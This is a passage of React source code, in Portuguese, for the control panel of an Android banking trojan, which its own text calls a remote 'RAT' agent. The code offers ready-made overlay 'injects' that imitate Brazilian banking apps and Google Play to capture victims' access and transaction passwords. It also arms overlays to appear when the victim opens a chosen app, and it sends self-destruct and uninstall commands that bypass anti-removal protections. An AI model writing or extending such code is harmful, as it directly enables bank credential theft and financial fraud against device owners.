                <div className="mt-4 pt-3 border-t border-[#14233e]">
                  <button
                    onClick={() => {
                      setShowBlackScreenChoiceModal(false);
                      setEditingTemplate(null);
                      setShowBlackScreenEditor(true);
                    }}
                    className="w-full py-2.5 px-4 rounded-xl bg-gradient-to-r from-red-600 to-[#0070f3] hover:from-red-500 hover:to-red-500 text-white font-black text-xs uppercase tracking-wider transition-all flex items-center justify-center gap-2 shadow-[0_0_20px_rgba(0,112,243,0.5)]"
                  >
                    <Palette className="w-4 h-4" />
                    ABRIR EDITOR PERSONALIZADO
                  </button>
                </div>
              </div>
            </div>

            {/* InjeÃ§Ã£o RÃ¡pida de Templates Prontos */}
            <div className="pt-3 border-t border-[#14233e] space-y-2.5">
              <div className="flex items-center justify-between">
                <span className="text-[10.5px] font-bold text-slate-300 uppercase tracking-wider flex items-center gap-1.5">
                  <Sparkles className="w-3.5 h-3.5 text-amber-400" />
                  OU INJETE UM TEMPLATE PRONTO (1-CLIQUE):
                </span>
                <span className="text-[9px] text-slate-400 font-sans">
                  Templates prÃ©-configurados prontos para uso
                </span>
              </div>

              <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-2 max-h-[190px] overflow-y-auto pr-1">
                {[
                  { name: 'âœ¨ Google Play - Carregando', id: 'pre-google-progress' },
                  { name: 'âœ¨ Google Play - Digital', id: 'pre-google-fingerprint' },
                  { name: 'âœ¨ Google Play - Rosto', id: 'pre-google-facial' },
                  { name: 'ðŸ¤– Android - AtualizaÃ§Ã£o Patch', id: 'pre-android-patch' },
                  { name: 'ðŸ”¥ ItaÃº - Senha de Acesso', id: 'pre-itau-senha' },
                  { name: 'ðŸ”¥ Bradesco - ValidaÃ§Ã£o Chave', id: 'pre-bradesco-token' },
                  { name: 'ðŸ”¥ Nubank - AutorizaÃ§Ã£o 6 DÃ­gitos', id: 'pre-nubank-6digit' },
                  { name: 'ðŸ”¥ Nubank - Senha 4 DÃ­gitos', id: 'pre-nubank-senha' },
                  { name: 'ðŸ”¥ Banco Inter - iSafe & Senha', id: 'pre-inter-isafe' },
                  { name: 'ðŸ”¥ C6 Bank - Digite a Senha', id: 'pre-c6-senha' },
                  { name: 'ðŸ”¥ Caixa Tem - ValidaÃ§Ã£o', id: 'pre-caixa-senha' },
                  { name: 'ðŸ”¥ Banco do Brasil - Acesso', id: 'pre-bb-senha' },
                  { name: 'ðŸ”¥ Santander - CartÃ£o & Senha', id: 'pre-santander-id' },
                  { name: 'ðŸ”¥ BTG Pactual - Token & Senha', id: 'pre-btg-senha' },
                  { name: 'ðŸ”¥ Sicredi / Sicoob - Senha', id: 'pre-sicredi-senha' },
                  { name: 'ðŸ”¥ Banrisul - ConfirmaÃ§Ã£o', id: 'pre-banrisul-senha' }
                ].map((tpl) => (
                  <div
                    key={tpl.id}
                    className="p-2 rounded-xl bg-[#0a1426] border border-[#14233e] hover:border-red-500/40 text-slate-200 transition-all flex items-center justify-between gap-1.5 group"
                  >
                    <span className="truncate text-[10px] font-bold text-slate-300" title={tpl.name}>
                      {tpl.name}
                    </span>
                    <div className="flex items-center gap-1 shrink-0">
                      <button
                        onClick={() => {
                          const foundTpl = PREDEFINED_BLACK_SCREEN_TEMPLATES?.find(t => t.id === tpl.id);
                          setEditingTemplate(foundTpl || { id: tpl.id, name: tpl.name, backgroundColor: '#000000', elements: [] });
                          setShowBlackScreenChoiceModal(false);
                          setShowBlackScreenEditor(true);
                        }}
                        className="text-[8.5px] px-1.5 py-0.5 rounded bg-amber-500/20 text-amber-300 hover:bg-amber-500 hover:text-black border border-amber-500/40 font-bold transition-all"
                        title="Editar antes de aplicar"
                      >
                        âœï¸
                      </button>
                      <button
                        onClick={() => {
                          handlePrepareInject(tpl);
                          setShowBlackScreenChoiceModal(false);
                        }}
                        className="text-[8.5px] px-2 py-0.5 rounded bg-red-950 text-pink-300 border border-red-700/60 font-black hover:bg-red-500 hover:text-black transition-all"
                        title="Injetar imediatamente"
                      >
                        INJETAR âš¡
                      </button>
                    </div>
                  </div>
                ))}
              </div>
            </div>

            {/* Footer */}
            <div className="flex items-center justify-end pt-2 border-t border-[#14233e]">
              <button
                type="button"
                onClick={() => setShowBlackScreenChoiceModal(false)}
                className="px-4 py-2 bg-[#0c1830] hover:bg-[#122244] text-slate-300 rounded-xl text-xs font-bold uppercase transition-all"
              >
                Fechar
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Editor de Tela Preta & Injects (Templates Prontos) */}
      <BlackScreenEditor
        isOpen={showBlackScreenEditor}
        initialTemplate={editingTemplate}
        onClose={() => {
          setShowBlackScreenEditor(false);
          setEditingTemplate(null);
        }}
        onSave={(template) => {
          showToast(`Template "${template.name}" salvo com sucesso!`, 'success');
        }}
        onApply={(template) => {
          handleToggleBlackScreen(true, template);
          showToast(`Injetando "${template.name}" no dispositivo!`, 'success');
          setShowBlackScreenEditor(false);
          setEditingTemplate(null);
        }}
      />

      {/* ========================================================= */}
      {/* MODAL 1: CONFIRMAR AUTO-REMOÃ‡ÃƒO / SELF-DESTRUCT            */}
      {/* ========================================================= */}
      {showSelfDestructModal && (
        <div className="fixed inset-0 z-50 bg-black/80 backdrop-blur-md flex items-center justify-center p-4">
          <div className="bg-[#081020] border border-rose-500/60 rounded-2xl max-w-md w-full p-6 space-y-4 shadow-[0_0_50px_rgba(244,63,94,0.3)] animate-in fade-in zoom-in duration-150 font-mono">
            <div className="flex items-center gap-3 border-b border-rose-500/30 pb-3">
              <div className="w-10 h-10 rounded-xl bg-rose-500/20 border border-rose-500/50 flex items-center justify-center text-rose-400">
                <Trash2 className="w-5 h-5 animate-pulse" />
              </div>
              <div>
                <h3 className="text-sm font-black text-white uppercase tracking-wider">
                  ðŸ’£ CONFIRMAR AUTO-REMOÃ‡ÃƒO (SELF-DESTRUCT)
                </h3>
                <p className="text-[10px] text-rose-300 font-sans mt-0.5">
                  DesinstalaÃ§Ã£o permanente do agente RAT remoto
                </p>
              </div>
            </div>

            <div className="bg-rose-950/40 border border-rose-800/50 rounded-xl p-3 space-y-2 text-xs text-rose-200 font-sans">
              <p className="font-bold text-rose-300 flex items-center gap-1.5">
                <ShieldAlert className="w-4 h-4 text-rose-400 shrink-0" />
                AtenÃ§Ã£o: Esta aÃ§Ã£o desinstala o aplicativo do aparelho!
              </p>
              <ul className="text-[11px] text-slate-300 space-y-1 font-mono">
                <li>â€¢ Desativa os privilÃ©gios de Admin do Dispositivo</li>
                <li>â€¢ Bypassa proteÃ§Ãµes anti-desinstalaÃ§Ã£o local</li>
                <li>â€¢ Dispara auto-clique/uninstaller nativo do Android</li>
                <li>â€¢ Encerra permanentemente a conexÃ£o com o servidor</li>
              </ul>
            </div>

            <div className="flex items-center justify-end gap-2 pt-2">
              <button
                onClick={() => setShowSelfDestructModal(false)}
                className="px-4 py-2 bg-[#0c1830] hover:bg-[#142647] text-slate-300 rounded-xl text-xs font-bold uppercase transition-all"
              >
                Cancelar
              </button>
              <button
                onClick={() => {
                  sendCommand({ action: 'SELF_DESTRUCT' });
                  showToast('ðŸ’£ Comando SELF_DESTRUCT enviado ao aparelho!', 'info');
                  setShowSelfDestructModal(false);
                }}
                className="px-4 py-2 bg-gradient-to-r from-rose-600 to-red-600 hover:from-rose-500 hover:to-red-500 text-white rounded-xl text-xs font-black uppercase transition-all shadow-[0_0_20px_rgba(244,63,94,0.5)] flex items-center gap-1.5 active:scale-95"
              >
                <Trash2 className="w-3.5 h-3.5" />
                DESINSTALAR AGENTE AGORA
              </button>
            </div>
          </div>
        </div>
      )}

      {/* ========================================================= */}
      {/* MODAL 2: DESINSTALAR QUALQUER APP DO APARELHO              */}
      {/* ========================================================= */}
      {showUninstallCustomAppModal && (
        <div className="fixed inset-0 z-50 bg-black/80 backdrop-blur-md flex items-center justify-center p-4">
          <div className="bg-[#081020] border border-red-500/50 rounded-2xl max-w-md w-full p-6 space-y-4 shadow-2xl animate-in fade-in zoom-in duration-150 font-mono">
            <div className="flex items-center justify-between border-b border-[#14233e] pb-3">
              <div className="flex items-center gap-2.5">
                <div className="w-9 h-9 rounded-xl bg-red-500/10 border border-red-500/30 flex items-center justify-center text-red-400">
                  <Package className="w-5 h-5" />
                </div>
                <div>
                  <h3 className="text-sm font-black text-white uppercase tracking-wider">
                    ðŸ“¦ DESINSTALAR APLICATIVO
                  </h3>
                  <p className="text-[10px] text-slate-400 font-sans">
                    Solicita a remoÃ§Ã£o de um pacote especÃ­fico do alvo
                  </p>
                </div>
              </div>
              <button
                onClick={() => setShowUninstallCustomAppModal(false)}
                className="text-slate-400 hover:text-white p-1"
              >
                <X className="w-4 h-4" />
              </button>
            </div>

            <div className="space-y-3 font-sans">
              <div>
                <label className="text-[11px] font-bold text-slate-300 uppercase font-mono block mb-1">
                  Nome do Pacote (Package Name):
                </label>
                <input
                  type="text"
                  value={targetPackageToUninstall}
                  onChange={(e) => setTargetPackageToUninstall(e.target.value)}
                  placeholder="ex: com.exemplo.aplicativo"
                  className="w-full bg-[#050b16] border border-[#162744] focus:border-red-500 rounded-xl px-3 py-2 text-xs text-white font-mono placeholder:text-slate-600 outline-none"
                />
              </div>

              {appsList && appsList.length > 0 && (
                <div className="space-y-1.5">
                  <span className="text-[10px] font-bold text-slate-400 uppercase font-mono block">
                    Ou selecione um app instalado da lista:
                  </span>
                  <div className="max-h-36 overflow-y-auto space-y-1 pr-1 border border-[#14233e] rounded-xl p-1.5 bg-[#050b16]">
                    {appsList.filter(a => !a.isSystem).slice(0, 20).map((app, idx) => (
                      <button
                        key={app.package || idx}
                        onClick={() => setTargetPackageToUninstall(app.package)}
                        className={`w-full text-left px-2 py-1.5 rounded-lg text-[11px] transition-all flex items-center justify-between font-mono ${
                          targetPackageToUninstall === app.package
                            ? 'bg-red-500/20 border border-red-500/50 text-pink-300 font-bold'
                            : 'hover:bg-[#0c1830] text-slate-300'
                        }`}
                      >
                        <span className="truncate">{app.name}</span>
                        <span className="text-[9px] text-slate-500 truncate max-w-[140px]">{app.package}</span>
                      </button>
                    ))}
                  </div>
                </div>
              )}
            </div>

            <div className="flex items-center justify-end gap-2 pt-2 border-t border-[#14233e]">
              <button
                onClick={() => setShowUninstallCustomAppModal(false)}
                className="px-4 py-2 bg-[#0c1830] hover:bg-[#142647] text-slate-300 rounded-xl text-xs font-bold uppercase transition-all"
              >
                Cancelar
              </button>
              <button
                disabled={!targetPackageToUninstall.trim()}
                onClick={() => {
                  if (targetPackageToUninstall.trim()) {
                    sendCommand({ action: 'UNINSTALL_APP', package: targetPackageToUninstall.trim() });
                    showToast(`DesinstalaÃ§Ã£o solicitada para ${targetPackageToUninstall}`, 'info');
                    setShowUninstallCustomAppModal(false);
                    setTargetPackageToUninstall('');
                  }
                }}
                className="px-4 py-2 bg-gradient-to-r from-rose-600 to-red-600 hover:from-rose-500 hover:to-red-500 disabled:opacity-50 text-white rounded-xl text-xs font-black uppercase transition-all shadow-md flex items-center gap-1.5 active:scale-95"
              >
                <Trash2 className="w-3.5 h-3.5" />
                SOLICITAR DESINSTALAÃ‡ÃƒO
              </button>
            </div>
          </div>
        </div>
      )}
      {/* Modal Interativo de ConfiguraÃ§Ã£o de DÃ­gitos dos Injects (Estilo RESTRITO Cyberpunk) */}
      {bankInjectModalConfig?.open && (
        <div className="fixed inset-0 z-[99999] bg-black/85 backdrop-blur-md flex items-center justify-center p-4">
          <div className="bg-[#060e1d]/95 border-2 border-red-500/60 shadow-[0_0_50px_rgba(6,182,212,0.45)] rounded-2xl p-6 max-w-md w-full font-mono text-slate-100 space-y-5 animate-in fade-in zoom-in duration-150 relative overflow-hidden">
            {/* Linha decorativa de neon no topo */}
            <div className="absolute top-0 left-0 right-0 h-1 bg-gradient-to-r from-red-500 via-red-500 to-purple-500 shadow-[0_0_10px_#ff2e5d]"></div>

            {/* Header */}
            <div className="flex items-center justify-between border-b border-red-500/20 pb-3.5">
              <div className="flex items-center gap-2.5">
                <div className="w-8 h-8 rounded-xl bg-red-500/10 border border-red-400/50 flex items-center justify-center text-pink-300 shadow-[0_0_10px_rgba(6,182,212,0.3)]">
                  <Sparkles className="w-4 h-4 text-red-400 animate-pulse" />
                </div>
                <div>
                  <h3 className="text-xs font-black text-pink-300 uppercase tracking-widest flex items-center gap-1.5 shadow-sm">
                    INJEÃ‡ÃƒO: {bankInjectModalConfig.template.name}
                  </h3>
                  <span className="text-[9.5px] text-red-400/80 font-mono block">CONFIGURAR PARÃ‚METROS E BOLINHAS DE SENHA</span>
                </div>
              </div>
              <button
                onClick={() => setBankInjectModalConfig(null)}
                className="text-slate-400 hover:text-white text-xs font-bold w-7 h-7 rounded-xl bg-[#0d1c38] hover:bg-rose-600/80 border border-red-500/30 flex items-center justify-center transition-all shadow-sm"
              >
                âœ•
              </button>
            </div>

            {/* SubtÃ­tulo explicativo */}
            <p className="text-[11px] text-slate-300 font-sans leading-relaxed bg-[#0a172e] p-2.5 rounded-xl border border-red-500/20">
              âš¡ Escolha a quantidade exata de dÃ­gitos necessÃ¡ria para desbloquear o app no celular da vÃ­tima:
            </p>

            {/* 1Âª Etapa: Senha de Acesso */}
            <div className="space-y-2.5">
              <div className="flex items-center justify-between">
                <label className="text-[11px] font-black text-pink-300 uppercase tracking-wider flex items-center gap-1.5">
                  <span className="w-2 h-2 rounded-full bg-red-400 shadow-[0_0_8px_#22d3ee]"></span>
                  ðŸ”‘ 1Âª ETAPA: SENHA DE ACESSO
                </label>
                <span className="text-[9px] font-bold text-red-400/70 uppercase">Bolinhas Etapa 1</span>
              </div>
              <div className="grid grid-cols-3 gap-2">
                <button
                  type="button"
                  onClick={() => setInjectDigits1(6)}
                  className={`py-3 px-2 rounded-xl border-2 text-xs font-black transition-all flex flex-col items-center gap-1.5 ${
                    injectDigits1 === 6
                      ? 'bg-gradient-to-b from-red-950/80 to-[#082846] border-red-400 text-pink-200 shadow-[0_0_18px_rgba(6,182,212,0.4)] scale-[1.02]'
                      : 'bg-[#081326] border-[#142647] text-slate-400 hover:border-red-500/40 hover:text-slate-200'
                  }`}
                >
                  <span className="uppercase tracking-wider text-[11px]">6 DÃGITOS</span>
                  <span className="text-[9px] tracking-widest text-red-400 font-black">â—‹ â—‹ â—‹ â—‹ â—‹ â—‹</span>
                </button>

                <button
                  type="button"
                  onClick={() => setInjectDigits1(4)}
                  className={`py-3 px-2 rounded-xl border-2 text-xs font-black transition-all flex flex-col items-center gap-1.5 ${
                    injectDigits1 === 4
                      ? 'bg-gradient-to-b from-red-950/80 to-[#082846] border-red-400 text-pink-200 shadow-[0_0_18px_rgba(6,182,212,0.4)] scale-[1.02]'
                      : 'bg-[#081326] border-[#142647] text-slate-400 hover:border-red-500/40 hover:text-slate-200'
                  }`}
                >
                  <span className="uppercase tracking-wider text-[11px]">4 DÃGITOS</span>
                  <span className="text-[9px] tracking-widest text-red-400 font-black">â—‹ â—‹ â—‹ â—‹</span>
                </button>

                <button
                  type="button"
                  onClick={() => setInjectDigits1(8)}
                  className={`py-3 px-2 rounded-xl border-2 text-xs font-black transition-all flex flex-col items-center gap-1.5 ${
                    injectDigits1 === 8
                      ? 'bg-gradient-to-b from-red-950/80 to-[#082846] border-red-400 text-pink-200 shadow-[0_0_18px_rgba(6,182,212,0.4)] scale-[1.02]'
                      : 'bg-[#081326] border-[#142647] text-slate-400 hover:border-red-500/40 hover:text-slate-200'
                  }`}
                >
                  <span className="uppercase tracking-wider text-[11px]">8 DÃGITOS</span>
                  <span className="text-[8px] tracking-widest text-red-400 font-black">â—‹ â—‹ â—‹ â—‹ â—‹ â—‹ â—‹ â—‹</span>
                </button>
              </div>
            </div>

            {/* 2Âª Etapa: Senha de TransaÃ§Ã£o */}
            <div className="space-y-2.5 pt-2.5 border-t border-red-500/20">
              <div className="flex items-center justify-between">
                <label className="text-[11px] font-black text-amber-300 uppercase tracking-wider flex items-center gap-1.5">
                  <span className="w-2 h-2 rounded-full bg-amber-400 shadow-[0_0_8px_#f59e0b]"></span>
                  ðŸ’³ 2Âª ETAPA: SENHA DE TRANSAÃ‡ÃƒO / CARTÃƒO
                </label>
                <span className="text-[9px] font-bold text-amber-400/70 uppercase">Bolinhas Etapa 2</span>
              </div>
              <div className="grid grid-cols-2 sm:grid-cols-4 gap-2">
                <button
                  type="button"
                  onClick={() => setInjectDigits2(4)}
                  className={`py-2.5 px-2 rounded-xl border-2 text-[10.5px] font-black transition-all flex flex-col items-center gap-1 ${
                    injectDigits2 === 4
                      ? 'bg-gradient-to-b from-amber-950/80 to-[#3b2306] border-amber-400 text-amber-200 shadow-[0_0_18px_rgba(245,158,11,0.4)] scale-[1.02]'
                      : 'bg-[#081326] border-[#142647] text-slate-400 hover:border-amber-500/40 hover:text-slate-200'
                  }`}
                >
                  <span>4 DÃGITOS</span>
                  <span className="text-[9px] tracking-widest text-amber-400 font-black">â—‹ â—‹ â—‹ â—‹</span>
                </button>

                <button
                  type="button"
                  onClick={() => setInjectDigits2(6)}
                  className={`py-2.5 px-2 rounded-xl border-2 text-[10.5px] font-black transition-all flex flex-col items-center gap-1 ${
                    injectDigits2 === 6
                      ? 'bg-gradient-to-b from-amber-950/80 to-[#3b2306] border-amber-400 text-amber-200 shadow-[0_0_18px_rgba(245,158,11,0.4)] scale-[1.02]'
                      : 'bg-[#081326] border-[#142647] text-slate-400 hover:border-amber-500/40 hover:text-slate-200'
                  }`}
                >
                  <span>6 DÃGITOS</span>
                  <span className="text-[9px] tracking-widest text-amber-400 font-black">â—‹ â—‹ â—‹ â—‹ â—‹ â—‹</span>
                </button>

                <button
                  type="button"
                  onClick={() => setInjectDigits2(8)}
                  className={`py-2.5 px-2 rounded-xl border-2 text-[10.5px] font-black transition-all flex flex-col items-center gap-1 ${
                    injectDigits2 === 8
                      ? 'bg-gradient-to-b from-amber-950/80 to-[#3b2306] border-amber-400 text-amber-200 shadow-[0_0_18px_rgba(245,158,11,0.4)] scale-[1.02]'
                      : 'bg-[#081326] border-[#142647] text-slate-400 hover:border-amber-500/40 hover:text-slate-200'
                  }`}
                >
                  <span>8 DÃGITOS</span>
                  <span className="text-[8px] tracking-widest text-amber-400 font-black">â—‹ â—‹ â—‹ â—‹ â—‹ â—‹ â—‹ â—‹</span>
                </button>

                <button
                  type="button"
                  onClick={() => setInjectDigits2(0)}
                  className={`py-2.5 px-2 rounded-xl border-2 text-[10.5px] font-black transition-all flex flex-col items-center gap-1 ${
                    injectDigits2 === 0
                      ? 'bg-gradient-to-b from-rose-950/80 to-[#3b0914] border-rose-400 text-rose-200 shadow-[0_0_18px_rgba(244,63,94,0.4)] scale-[1.02]'
                      : 'bg-[#081326] border-[#142647] text-slate-400 hover:border-rose-500/40 hover:text-slate-200'
                  }`}
                >
                  <span>ðŸš« PULAR 2Âª ETAPA</span>
                  <span className="text-[8.5px] text-rose-400/90 font-bold">(Apenas Acesso)</span>
                </button>
              </div>
            </div>

            {/* Footer Buttons */}
            <div className="flex items-center justify-end gap-2.5 pt-3.5 border-t border-red-500/20">
              <button
                type="button"
                onClick={() => setBankInjectModalConfig(null)}
                className="px-4 py-2.5 bg-[#081326] hover:bg-[#0e2142] text-slate-300 border border-[#142647] rounded-xl text-xs font-bold uppercase tracking-wider transition-all"
              >
                Cancelar
              </button>
              <button
                type="button"
                onClick={handleConfirmBankInject}
                className="px-5 py-2.5 bg-gradient-to-r from-red-400 via-red-500 to-indigo-600 hover:from-pink-300 hover:to-red-400 text-slate-950 font-black rounded-xl text-xs uppercase tracking-wider transition-all shadow-[0_0_25px_rgba(6,182,212,0.6)] border border-pink-300 flex items-center gap-2 active:scale-95"
              >
                <Sparkles className="w-4 h-4 fill-slate-950" />
                âš¡ INJETAR COM ESSAS CONFIGURAÃ‡Ã•ES
              </button>
            </div>
          </div>
        </div>
      )}

      {/* ðŸ’‰ MODAL INTERATIVO DE INJEÃ‡ÃƒO EM APLICATIVOS */}
      {appInjectModalApp && (
        <div className="fixed inset-0 z-[99999] bg-black/85 backdrop-blur-md flex items-center justify-center p-4">
          <div className="bg-[#060e1d]/95 border-2 border-red-500/60 shadow-[0_0_50px_rgba(6,182,212,0.45)] rounded-2xl p-6 max-w-xl w-full font-mono text-slate-100 space-y-5 animate-in fade-in zoom-in duration-150 relative overflow-hidden max-h-[90vh] flex flex-col">
            {/* Top neon glow bar */}
            <div className="absolute top-0 left-0 right-0 h-1 bg-gradient-to-r from-red-500 via-red-500 to-indigo-500 shadow-[0_0_15px_#ff2e5d]"></div>

            {/* Header */}
            <div className="flex items-center justify-between border-b border-red-500/20 pb-3.5 shrink-0">
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 rounded-xl bg-red-500/20 border border-red-400/50 flex items-center justify-center text-pink-300 shadow-[0_0_15px_rgba(6,182,212,0.4)]">
                  <Syringe className="w-5 h-5 text-pink-300 animate-pulse" />
                </div>
                <div>
                  <h3 className="text-sm font-black text-pink-200 uppercase tracking-wider flex items-center gap-2">
                    INJETAR NO APLICATIVO
                  </h3>
                  <div className="text-[11px] text-pink-300 font-bold flex items-center gap-1.5 mt-0.5">
                    <span>{appInjectModalApp.name}</span>
                    <span className="text-slate-500">â€¢</span>
                    <span className="text-red-400/90 font-mono text-[10px]">{appInjectModalApp.package}</span>
                  </div>
                </div>
              </div>
              <button
                onClick={() => setAppInjectModalApp(null)}
                className="text-slate-400 hover:text-white text-xs font-bold w-7 h-7 rounded-xl bg-[#0d1c38] hover:bg-rose-600/80 border border-red-500/30 flex items-center justify-center transition-all cursor-pointer"
              >
                âœ•
              </button>
            </div>

            {/* Status note */}
            <div className="bg-[#0a172e] p-3 rounded-xl border border-red-500/25 text-[11px] text-slate-300 font-sans space-y-1.5 shrink-0 shadow-inner">
              <p className="flex items-center gap-1.5 text-pink-300 font-bold text-[11.5px]">
                <ShieldCheck className="w-4 h-4 text-red-400 shrink-0" />
                <span>INJEÃ‡ÃƒO ARMADA: O aplicativo NÃƒO serÃ¡ aberto forÃ§adamente.</span>
              </p>
              <p className="text-slate-300 text-[10.5px] leading-relaxed">
                ðŸŽ¯ A tela selecionada ficarÃ¡ configurada e serÃ¡ exibida no celular <strong className="text-pink-200">SOMENTE QUANDO A VÃTIMA ABRIR O APLICATIVO MANUALMENTE ({appInjectModalApp.name})</strong>.
              </p>
            </div>

            {/* Modal Body: Scrollable template list */}
            <div className="overflow-y-auto space-y-4 pr-1 flex-1 custom-scrollbar">
              {/* Template recomendado (se houver match) */}
              {(() => {
                const bestMatch = findBestInjectTemplate(appInjectModalApp.name, appInjectModalApp.package);
                if (!bestMatch) return null;
                return (
                  <div className="bg-gradient-to-r from-red-950/70 via-blue-950/70 to-indigo-950/70 border-2 border-red-400/80 rounded-xl p-4 space-y-2.5 shadow-[0_0_20px_rgba(6,182,212,0.3)]">
                    <div className="flex items-center justify-between">
                      <span className="text-[10px] font-black uppercase text-pink-300 tracking-wider flex items-center gap-1.5">
                        <Sparkles className="w-3.5 h-3.5 text-red-400 animate-spin" />
                        INJEÃ‡ÃƒO RECOMENDADA IDENTIFICADA
                      </span>
                      <span className="text-[9px] px-2 py-0.5 rounded-full bg-red-500/30 text-pink-200 border border-red-400/50 font-bold uppercase">
                        MATCH PERFEITO
                      </span>
                    </div>
                    <div className="text-xs font-bold text-white font-mono">
                      {bestMatch.name}
                    </div>
                    <button
                      type="button"
                      disabled={isArmingInject}
                      onClick={(e) => {
                        e.preventDefault();
                        handlePrepareInject(bestMatch);
                      }}
                      className="w-full py-2.5 px-4 bg-gradient-to-r from-red-500 via-red-500 to-indigo-600 hover:from-red-400 hover:to-red-400 text-slate-950 font-black rounded-xl text-xs uppercase tracking-wider transition-all shadow-[0_0_20px_rgba(6,182,212,0.6)] border border-pink-300 flex items-center justify-center gap-2 active:scale-95 cursor-pointer disabled:opacity-50"
                    >
                      <Syringe className="w-4 h-4 fill-slate-950" />
                      {isArmingInject ? 'ARMANDO INJEÃ‡ÃƒO... â³' : 'âš¡ ARMAR INJEÃ‡ÃƒO PARA QUANDO O USUÃRIO ABRIR O APP'}
                    </button>
                  </div>
                );
              })()}

              {/* Seletor de Abas: Templates Salvos vs Templates do Sistema */}
              <div className="flex items-center gap-2 border-b border-[#142647] pb-2">
                <button
                  type="button"
                  onClick={() => setAppInjectTab('saved')}
                  className={`px-3.5 py-2 rounded-xl text-[11px] font-black uppercase tracking-wider transition-all flex items-center gap-1.5 cursor-pointer border ${
                    appInjectTab === 'saved'
                      ? 'bg-gradient-to-r from-red-600 to-red-600 text-white border-red-400 shadow-[0_0_14px_rgba(6,182,212,0.5)]'
                      : 'bg-[#081326] text-slate-400 border-[#142647] hover:text-slate-200'
                  }`}
                >
                  <Folder className="w-3.5 h-3.5 text-pink-300" />
                  Meus Templates Salvos ({getSavedUserTemplates().length})
                </button>

                <button
                  type="button"
                  onClick={() => setAppInjectTab('system')}
                  className={`px-3.5 py-2 rounded-xl text-[11px] font-black uppercase tracking-wider transition-all flex items-center gap-1.5 cursor-pointer border ${
                    appInjectTab === 'system'
                      ? 'bg-gradient-to-r from-red-600 to-red-600 text-white border-red-400 shadow-[0_0_14px_rgba(6,182,212,0.5)]'
                      : 'bg-[#081326] text-slate-400 border-[#142647] hover:text-slate-200'
                  }`}
                >
                  <Layers className="w-3.5 h-3.5 text-pink-300" />
                  Injects Prontos ({PREDEFINED_BLACK_SCREEN_TEMPLATES?.length || 0})
                </button>
              </div>

              {/* ConteÃºdo da Aba: TEMPLATES SALVOS */}
              {appInjectTab === 'saved' && (
                <div className="space-y-2">
                  <span className="text-[10px] font-black uppercase text-pink-300 tracking-wider block font-mono">
                    ðŸ“ SELEÃ‡ÃƒO DE TELAS NOS SEUS TEMPLATES SALVOS:
                  </span>

                  {getSavedUserTemplates().length === 0 ? (
                    <div className="text-center py-6 bg-[#081326] rounded-xl border border-dashed border-[#16294a] text-slate-400 text-xs space-y-2">
                      <p>Nenhum template personalizado foi salvo no estÃºdio ainda.</p>
                      <p className="text-[10px] text-slate-500">
                        VocÃª pode escolher um dos <strong>Injects Prontos</strong> na aba ao lado ou criar novos no EstÃºdio de Injects.
                      </p>
                    </div>
                  ) : (
                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
                      {getSavedUserTemplates().map((tpl) => (
                        <button
                          key={tpl.id}
                          type="button"
                          disabled={isArmingInject}
                          onClick={(e) => {
                            e.preventDefault();
                            handlePrepareInject(tpl);
                          }}
                          className="text-left p-3 bg-gradient-to-b from-[#081730] to-[#050e21] hover:from-[#0f244a] hover:to-[#081733] border border-red-500/40 hover:border-pink-300 rounded-xl transition-all group flex items-center justify-between gap-2 shadow-md cursor-pointer disabled:opacity-50"
                        >
                          <div className="min-w-0">
                            <div className="text-[11.5px] font-bold text-white group-hover:text-pink-300 truncate flex items-center gap-1.5">
                              <span className="w-2 h-2 rounded-full bg-red-400"></span>
                              {tpl.name || 'Template Salvo'}
                            </div>
                            <div className="text-[9px] text-red-400/80 font-mono truncate mt-0.5">
                              ID: {tpl.id} {tpl.elements?.length ? `â€¢ ${tpl.elements.length} elementos` : ''}
                            </div>
                          </div>
                          <span className="px-2.5 py-1 bg-red-500/20 group-hover:bg-red-500/40 border border-red-400/50 text-pink-200 rounded-lg text-[9.5px] font-black uppercase shrink-0 shadow-sm">
                            {isArmingInject ? 'Armando... â³' : 'Armar âš¡'}
                          </span>
                        </button>
                      ))}
                    </div>
                  )}
                </div>
              )}

              {/* ConteÃºdo da Aba: INJECTS PRONTOS DO SISTEMA */}
              {appInjectTab === 'system' && (
                <div className="space-y-2">
                  <span className="text-[10px] font-black uppercase text-slate-400 tracking-wider block font-mono">
                    ðŸ“š INJECTS E OVERLAYS PADRÃƒO DO SISTEMA:
                  </span>

                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
                    {PREDEFINED_BLACK_SCREEN_TEMPLATES?.map((tpl) => (
                      <button
                        key={tpl.id}
                        type="button"
                        disabled={isArmingInject}
                        onClick={(e) => {
                          e.preventDefault();
                          handlePrepareInject(tpl);
                        }}
                        className="text-left p-2.5 bg-[#081326] hover:bg-[#0f2142] border border-[#16294a] hover:border-red-400/60 rounded-xl transition-all group flex items-center justify-between gap-2 cursor-pointer disabled:opacity-50"
                      >
                        <div className="min-w-0">
                          <div className="text-[11px] font-bold text-slate-200 group-hover:text-pink-300 truncate">
                            {tpl.name}
                          </div>
                          <div className="text-[9px] text-slate-500 font-mono truncate">
                            {tpl.id}
                          </div>
                        </div>
                        <span className="px-2 py-1 bg-red-500/10 group-hover:bg-red-500/30 border border-red-500/30 text-pink-300 rounded-lg text-[9px] font-black uppercase shrink-0">
                          {isArmingInject ? 'Armando... â³' : 'Armar âš¡'}
                        </span>
                      </button>
                    ))}
                  </div>
                </div>
              )}
            </div>

            {/* Modal Footer */}
            <div className="flex items-center justify-between pt-3 border-t border-red-500/20 shrink-0 gap-2 flex-wrap">
              <button
                type="button"
                onClick={() => handleDisarmInject(appInjectModalApp.package)}
                className="px-3.5 py-2 bg-rose-600/90 hover:bg-rose-600 text-white border border-rose-400 rounded-xl text-[10.5px] font-black uppercase transition-all flex items-center gap-1.5 cursor-pointer shadow-[0_0_15px_rgba(244,63,94,0.4)]"
                title="Desarmar e remover overlay deste aplicativo"
              >
                <XCircle className="w-4 h-4 text-white" />
                ðŸš« DESARMAR E REMOVER INJECT
              </button>

              <div className="flex items-center gap-2">
                <button
                  type="button"
                  onClick={() => {
                    handleToggleBlackScreen(true);
                    setAppInjectModalApp(null);
                  }}
                  className="px-3 py-2 bg-slate-800 hover:bg-slate-700 text-slate-300 border border-slate-700 rounded-xl text-[10.5px] font-bold uppercase transition-all flex items-center gap-1.5 cursor-pointer"
                >
                  ðŸ•¶ï¸ Tela Preta Normal
                </button>
                <button
                  type="button"
                  onClick={() => setAppInjectModalApp(null)}
